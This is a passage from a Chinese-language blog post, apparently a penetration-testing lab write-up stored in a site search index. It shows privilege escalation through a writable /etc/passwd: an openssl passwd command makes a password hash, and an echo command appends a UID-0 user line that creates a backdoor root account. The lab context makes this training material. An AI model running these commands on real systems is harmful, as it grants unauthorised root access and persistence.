&#x2F;etc&#x2F;passwd 有写权限<br><img src="/Rxi134_FILE/bf11baf48105c308ba73a35040d28755_MD5.jpeg"><br>创建一个新用户x1nri，密码为123</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> x1nri <span class="token number">123</span><span class="token variable">$1</span><span class="token variable">$x1nri</span><span class="token variable">$RuLBMKXnN1w</span>.xtGk5bIT21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么passwd条目为</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">x1nri:$1$x1nri$RuLBMKXnN1w.xtGk5bIT21:0:0:root:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>追加重定向到末尾即可。记得转义$</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"x1nri:\<span class="token variable">$1</span>\<span class="token variable">$x1nri</span>\<span class="token variable">$RuLBMKXnN1w</span>.xtGk5bIT21:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/2dde81a003d363f0b9a2b03fca9564ce_MD5.jpeg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过该靶机，我学习到了</p><ul><li>更加深入了解了sqlmap</li></ul>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
